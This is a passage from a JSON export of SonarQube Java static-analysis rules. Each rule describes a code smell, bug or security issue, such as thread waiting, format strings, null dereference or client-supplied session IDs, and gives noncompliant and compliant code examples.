<li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>\n  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>\n  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"covered","ruleKey":"RSPEC-2325","summary":"\"private\" and \"final\" methods that don't access instance data should be \"static\"","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Files with no lines of code clutter a project and should be removed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n//package org.foo;\n//\n//public class Bar {}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2309","summary":"Files should not be empty","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>\n<ul>\n  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>\n  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nFile file = new File(\"file.txt\");\nfile.deleteOnExit();  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2308","summary":"\"deleteOnExit\" should not be used","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A selector argument is a <code>boolean</code> argument thatâs used to determine which of two paths to take through a method. Specifying such a\nparameter may seem innocuous, particularly if itâs well named.</p>\n<p>Unfortunately, the maintainers of the code calling the method wonât see the parameter name, only its value. Theyâll be forced either to guess at\nthe meaning or to take extra time to look the method up.</p>\n<p>Instead, separate methods should be written.</p>\n<p>This rule finds methods with a <code>boolean</code> thatâs used to determine which path to take through the method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic String tempt(String name, boolean ofAge) {\n  if (ofAge) {\n    offerLiquor(name);\n  } else {\n    offerCandy(name);\n  }\n}\n\n// ...\npublic void corrupt() {\n  tempt(\"Joe\", false); // does this mean not to temp Joe?\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void temptAdult(String name) {\n  offerLiquor(name);\n}\n\npublic void temptChild(String name) {\n    offerCandy(name);\n}\n\n// ...\npublic void corrupt() {\n  age &lt; legalAge ? temptChild(\"Joe\") : temptAdult(\"Joe\");\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2301","summary":"Public methods should not contain selector arguments","tags":["design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Java uses angular brackets (<code>&lt;</code> and <code>&gt;</code>) to provide a specific type (the \"type argument\") to a generic type. For\ninstance, <code>List</code> is a generic type, so a list containing strings can be declared with <code>List&lt;String&gt;</code>.</p>\n<p>Prior to Java 7, the type argument had to be provided explicitly for every occurrence where generics were used. This often caused redundancy, as\nthe type argument would have to be provided both when a field is declared and initialized.</p>\n<p>Java 7 introduced the diamond operator (<code>&lt;&gt;</code>) to reduce the codeâs verbosity in some situations. The type argument between the\nangular brackets should be omitted if the compiler can infer it.</p>\n<p>Since the diamond operator was only introduced in Java 7, this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is\nlower than <code>7</code>.</p>\n<h2>How to fix it</h2>\n<p>The type argument should be omitted in the initialization if it is already present in the declaration of a field or variable.</p>\n<p>For instance, a field with type <code>List&lt;String&gt;</code> can be initialized with <code>ArrayList&lt;&gt;()</code>, as the compiler will\ninfer that <code>ArrayList&lt;String&gt;()</code> is the actually desired call.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nList&lt;String&gt; strings = new ArrayList&lt;String&gt;();                       // Noncompliant, the compiler can infer the type argument of the constructor invocation\nMap&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;String,List&lt;Integer&gt;&gt;();  // Noncompliant, the compiler can also infer complex type arguments\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nList&lt;String&gt; strings = new ArrayList&lt;&gt;();        // Compliant, the compiler will infer the type argument\nMap&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;(); // Compliant, the compiler will infer the type argument\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/generics/genTypeInference.html\">The Javaâ¢ Tutorials</a> - Type Inference (Generics) </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2293","summary":"The diamond operator (\"<>\") should be used","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>In a multithreaded environment, a thread may need to wait for a particular condition to become true. One way of pausing execution in Java is\n<code>Thread.sleep(â¦â)</code>.</p>\n<p>If a thread that holds a lock calls <code>Thread.sleep(â¦â)</code>, no other thread can acquire said lock. This can lead to performance and\nscalability issues, in the worst case leading to deadlocks.</p>\n<h2>How to fix it</h2>\n<p>Call <code>wait(â¦â)</code> on the monitor object instead of using <code>Thread.sleep(â¦â)</code>. While <code>wait(â¦â)</code> is executed, the lock\nis temporarily released and hence other threads can run in the meantime.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      Thread.sleep(200); // Noncompliant, any other thread synchronizing on monitor is blocked from running while the first thread sleeps.\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomething(){\n  synchronized(monitor) {\n    while(notReady()){\n      monitor.wait(200); // Compliant, the current monitor is released.\n    }\n    process();\n  }\n  ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTdGBQ\">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a lock </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2276","summary":"\"wait(...)\" should be used instead of \"Thread.sleep(...)\" when a lock is held","tags":["multi-threading","performance","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors\nthat lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling\nthe <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,\n<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>\nor <code>java.io.PrintWriter</code> classes.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString.format(\"The value of my integer is %d\", \"Hello World\");  // Noncompliant; an 'int' is expected rather than a String\nString.format(\"Duke's Birthday year is %tX\", c);  //Noncompliant; X is not a supported time conversion character\nString.format(\"Display %0$d and then %d\", 1);   //Noncompliant; arguments are numbered starting from 1\nString.format(\"Not enough arguments %d and %d\", 1);  //Noncompliant; the second argument is missing\nString.format(\"%&lt; is equals to %d\", 2);   //Noncompliant; the argument index '&lt;' refers to the previous format specifier but there isn't one\n\nMessageFormat.format(\"Result {1}.\", value); // Noncompliant; Not enough arguments. (first element is {0})\nMessageFormat.format(\"Result {{0}.\", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)\nMessageFormat.format(\"Result ' {0}\", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1}!\", 14); // Noncompliant - Not enough arguments.\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\"); // Noncompliant - Not enough arguments.\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\"); // Noncompliant - Not enough arguments.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString.format(\"The value of my integer is %d\", 3);\nString.format(\"Duke's Birthday year is %tY\", c);\nString.format(\"Display %1$d and then %d\", 1);\nString.format(\"Not enough arguments %d and %d\", 1, 2);\nString.format(\"%d is equals to %&lt;\", 2);\n\nMessageFormat.format(\"Result {0}.\", value);\nMessageFormat.format(\"Result {0} &amp; {1}.\", value, value);\nMessageFormat.format(\"Result {0}.\", myObject);\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1},{2}!\", 14, 2);\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\", 1);\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\", 1);\n</pre>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2275","summary":"Printf-style format strings should not lead to unexpected behavior at runtime","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In a multithreaded environment, the <code>Object.wait(â¦â)</code>, as well as <code>Condition.await(â¦â)</code> and similar methods are used to pause\nthe execution of a thread until the thread is awakened. A thread is typically awakened when it is notified, signaled, or interrupted, usually because\nof an event in another thread requiring some subsequent action by the waiting thread.</p>\n<p>However, a thread may be awakened despite the desired condition not being met or the desired event not having happened. This is referred to as\n\"spurious wakeups\" and may be caused by underlying platform semantics. In other words, a thread may be awakened due to reasons that have nothing to do\nwith the business logic. Hence, the assumption that the desired condition is met or the desired event occurred after a thread is awakened does not\nalways hold.</p>\n<p>According to the documentation of the Java <code>Condition</code> interface [1]:</p>\n<blockquote>\n  <p>When waiting upon a <code>Condition</code>, a \"spurious wakeup\" is permitted to occur, in general, as a concession to the underlying platform\n  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state\n  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications\n  programmers always assume that they can occur and so always wait in a loop.</p>\n</blockquote>\n<p>The same advice is also found for the <code>Object.wait(â¦â)</code> method [2]:</p>\n<blockquote>\n  <p>[â¦â] waits should always occur in loops, like this one:</p>\n  <pre>\nsynchronized (obj) {\n  while (&lt;condition does not hold&gt;){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n</blockquote>\n<h2>How to fix it</h2>\n<p>Make sure that the desired condition is actually true after being awakened. This can be accomplished by calling the <code>wait</code> or\n<code>await</code> methods inside a loop that checks said condition.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nsynchronized (obj) {\n  if (!suitableCondition()){\n    obj.wait(timeout); // Noncompliant, the thread can be awakened even though the condition is still false\n  }\n   ... // Perform some logic that is appropriate for when the condition is true\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nsynchronized (obj) {\n  while (!suitableCondition()){\n    obj.wait(timeout); // Compliant, the condition is checked in a loop, so the action below will only occur if the condition is true\n  }\n   ... // Perform some logic that is appropriate for when the condition is true\n}\n</pre>\n<h2>Resources</h2>\n<ol>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/concurrent/locks/Condition.html\">Java SE 17 &amp; JDK 17</a> -\n  Condition </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#wait--\">Java Platform SE 8</a> - Object#wait </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EzdGBQ\">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop </li>\n</ol>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2274","summary":"\"Object.wait(...)\" and \"Condition.await(...)\" should be called inside a \"while\" loop","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Object.wait(â¦â)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> methods are used in multithreaded environments\nto coordinate interdependent tasks that are performed by different threads. These methods are not thread-safe and by contract, they require the\ninvoking <code>Thread</code> to own the objectâs monitor. If a thread invokes one of these methods without owning the objectâs monitor an\n<code>IllegalMonitorStateException</code> is thrown.</p>\n<h2>How to fix it</h2>\n<p>To become the owner of an objectâs monitor Java provides the <code>synchronized</code> keyword. In other words, calling\n<code>Object.wait(â¦â)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> on a given object should only be done from code\nsynchronized on the same object.</p>\n<p>For example, the call to <code>someObject.wait(â¦â)</code> should be wrapped in a <code>synchronized(someObject){ â¦â }</code> block. If\n<code>wait</code> or <code>notify</code> are invoked on <code>this</code>, then the entire method can be marked as <code>synchronized</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate void performSomeAction(Object syncValue) {\n  while (!suitableCondition()){\n    syncValue.wait(); // Noncompliant, not being inside a `synchronized` block, this will raise an IllegalMonitorStateException\n  }\n  ... // Perform some action\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate void performSomeAction(Object syncValue) {\n  synchronized(syncValue) {\n    while (!suitableCondition()){\n      syncValue.wait(); // Compliant, the `synchronized` block guarantees ownership of syncValue's monitor\n    }\n    ... // Perform some action\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/concurrency/syncmeth.html\">Java Documentation</a> - Synchronized methods </li>\n  <li> <a href=\"https://docs.oracle.com/javase%2F7%2Fdocs%2Fapi%2F%2F/java/lang/Object.html#wait()\">Java Documentation</a> - java.lang.Object class\n  and its methods </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2273","summary":"\"Object.wait()\", \"Object.notify()\" and \"Object.notifyAll()\" should only be called from synchronized code","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>java.util.Iterator.next()</code> method must throw a <code>NoSuchElementException</code> when there are no more elements in the\niteration. Any other behavior is non-compliant with the API contract and may cause unexpected behavior for users.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyIterator implements Iterator&lt;String&gt; {\n  public String next() {\n    if (!hasNext()) {\n      return null;\n    }\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyIterator implements Iterator&lt;String&gt; {\n  public String next() {\n    if (!hasNext()) {\n      throw new NoSuchElementException();\n    }\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/Iterator.html#next--\">Java SE 7 API Specification: Iterator</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2272","summary":"\"Iterator.next()\" methods should throw \"NoSuchElementException\"","tags":["error-handling","unpredictable"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number\nof files that do not parse but also to easily find out why they do not parse.</p>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-2260","summary":"Java parser failure","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At\nbest, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or\nit could allow an attacker to bypass security measures.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void method(Object input) {\n  if (input == null) {\n    // ...\n  }\n  System.out.println(input.toString()); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void method(Object input) {\n  if (input == null) {\n    // ...\n    return;\n  }\n  System.out.println(input.toString());\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nvoid paint(Color color) {\n  if (color == null) {\n    System.out.println(\"Unable to apply color \" + color.toString());  // Noncompliant; NullPointerException will be thrown\n    return;\n  }\n  //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nvoid paint(Color color) {\n  if (color == null) {\n    System.out.println(\"Unable to apply color.\");\n    return;\n  }\n  //...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476\">MITRE, CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/QdcxBQ\">CERT, EXP34-C.</a> - Do not dereference null pointers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2259","summary":"Null pointers should not be dereferenced","tags":["cwe","cert","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, â¦â should be used instead.</p>\n<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class MyCryptographicAlgorithm extends MessageDigest {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2257","summary":"Using non-standard cryptographic algorithms is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This function uses a session ID that is supplied by the client. Because of this, the ID may not be valid or might even be spoofed.</p>\n<h2>Why is this an issue?</h2>\n<p>According to the API documentation of the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>\n<blockquote>\n  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client\n  did not specify a session ID, this method returns null.</p>\n</blockquote>\n<p>The session ID it returns is either transmitted through a cookie or a URL parameter. This allows an end user to manually update the value of this\nsession ID in an HTTP request.</p>\n<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (e.g.\nTomcat or Jetty) to see if the value matches the ID of an existing session. If it does not, the user should be considered unauthenticated.</p>\n<h3>What is the potential impact?</h3>\n<p>Using a client-supplied session ID to manage sessions on the server side can potentially have an impact on the security of the application.</p>\n<h4>Impersonation (through session fixation)</h4>\n<p>If an attacker succeeds in fixing a userâs session to a session identifier that they know, then they can impersonate this victim and gain access to\ntheir account without providing valid credentials. This can result in unauthorized actions, such as modifying personal information, making\nunauthorized transactions, or even performing malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing\nactions they wouldnât normally do, such as revealing sensitive information or conducting financial transactions on the attackerâs behalf.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>In both examples, a session ID is used to check whether a userâs session is still active. In the noncompliant example, the session ID supplied by\nthe user is used. In the compliant example, the session ID defined by the server is used instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (isActiveSession(request.getRequestedSessionId())) { // Noncompliant\n    // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (isActiveSession(request.getSession().getId())) {\n    // ...\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The noncompliant example uses <code>HttpServletRequest.getRequestedSessionId()</code> to retrieve a session ID. This ID is then used to verify if\nthe given session is still active. As this value is given by a user, this value is not guaranteed to be a valid ID.</p>\n<p>The compliant example instead uses the serverâs session ID to verify if the session is active. Additionally, <code>getSession()</code> will create\na new session if the userâs request does not contain a valid ID.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Jakarta EE Documentation - <a\n  href=\"https://jakarta.ee/specifications/platform/10/apidocs/jakarta/servlet/http/httpservletrequest#getRequestedSessionId--\"><code>HttpServletRequest</code> - <code>getRequestedSessionId</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/807\">CWE-807 - Reliance on Untrusted Inputs in a Security Decision</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222582\">Application Security and\n  Development: V-222582</a> - The application must not re-use or recycle session IDs. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2254","summary":"\"HttpServletRequest.getRequestedSessionId()\" should not be used","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows banning certain methods.</p>\n<h3>Noncompliant code example</h3>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n  <li> methodName: replace </li>\n  <li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence </li>\n</ul>\n<pre>\nString name;\nname.replace(\"A\",\"a\");  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2253","summary":"Track uses of disallowed methods","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html\"><code>for</code></a> loop is a fundamental programming construct\nused to execute a block of code repeatedly. However, if the loopâs condition is false before the first iteration, the loop will never execute.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; 0; i++) {  // Noncompliant: the condition is always false, and the loop will never execute\n    // ...\n}\n</pre>\n<p>Rewrite the loop to ensure the condition evaluates to <code>true</code> at least once.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (int i = 0; i &lt; 10; i++) {  // Compliant: the condition is true at least once, the loop will execute\n    // ...\n}\n</pre>\n<p>This bug has the potential to cause unexpected outcomes as the loop might contain critical code that needs to be executed.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html\">The <code>for</code> statement</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2252","summary":"Loop conditions should be true at least once","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>for</code> loop with a counter moving away from the end of the specified range is likely a programming mistake.</p>\n<p>If the intention is to iterate over the specified range, this differs from what the loop does because the counter moves in the wrong direction.</p>\n<p>If the intention is to have an infinite loop or a loop terminated only by a break statement, there are two problems:</p>\n<ol>\n  <li> The loop condition is not infinite because the counter variable will eventually overflow and fulfill the condition. This can take a long time,\n  depending on the data type of the counter. </li>\n  <li> An infinite loop terminated by a <code>break</code> statement should be implemented using a <code>while</code> or <code>do</code>\n  <code>while</code> loop to make the developerâs intention clear to the reader. </li>\n</ol>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Change the direction of the counter.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (int i = 10; i &gt; 0; i++) { // Noncompliant, wrong direction\n  System.out.println(\"Hello, world!\") // executed ca. 2 billion times\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant, wrong direction\n    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (int i = 10; i &gt; 0; 